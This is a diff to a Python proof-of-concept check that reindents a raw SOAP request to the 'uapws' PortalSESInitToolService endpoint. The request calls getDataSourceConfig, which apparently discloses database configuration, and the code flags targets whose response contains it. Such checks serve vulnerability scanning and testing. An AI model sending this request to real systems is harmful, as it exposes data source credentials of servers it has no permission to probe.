@@ -37,18 +37,18 @@ class Poc(ABPoc):
             arg = '{target}'.format(target=self.target)
             url = arg + "uapws/service/nc.itf.ses.inittool.PortalSESInitToolService"
             raw = """POST /uapws/service/nc.itf.ses.inittool.PortalSESInitToolService HTTP/1.1
-                Host: www.baidu.com
-                Cache-Control: max-age=0
-                Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
-                Upgrade-Insecure-Requests: 1
-                User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/47.0.2526.73 Chrome/47.0.2526.73 Safari/537.36
-                DNT: 1
-                Accept-Encoding: gzip, deflate, sdch
-                Accept-Language: en-US,en;q=0.8,zh-CN;q=0.6,zh;q=0.4
-                Cookie: JSESSIONID=8094FB584D86D05EC578B3DA1A08BBA8.server
-                Content-Length: 349
+Host: www.baidu.com
+Cache-Control: max-age=0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/47.0.2526.73 Chrome/47.0.2526.73 Safari/537.36
+DNT: 1
+Accept-Encoding: gzip, deflate, sdch
+Accept-Language: en-US,en;q=0.8,zh-CN;q=0.6,zh;q=0.4
+Cookie: JSESSIONID=8094FB584D86D05EC578B3DA1A08BBA8.server
+Content-Length: 349
 
-                <?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><getDataSourceConfig xmlns="http://inittool.ses.itf.nc/PortalSESInitToolService"></getDataSourceConfig></soap:Body></soap:Envelope>"""
+<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><getDataSourceConfig xmlns="http://inittool.ses.itf.nc/PortalSESInitToolService"></getDataSourceConfig></soap:Body></soap:Envelope>"""
 
             code, head,res, errcode, _ = hh.http(url,raw=raw)
             if code == 200 and 'getDataSourceConfigResponse' in res:
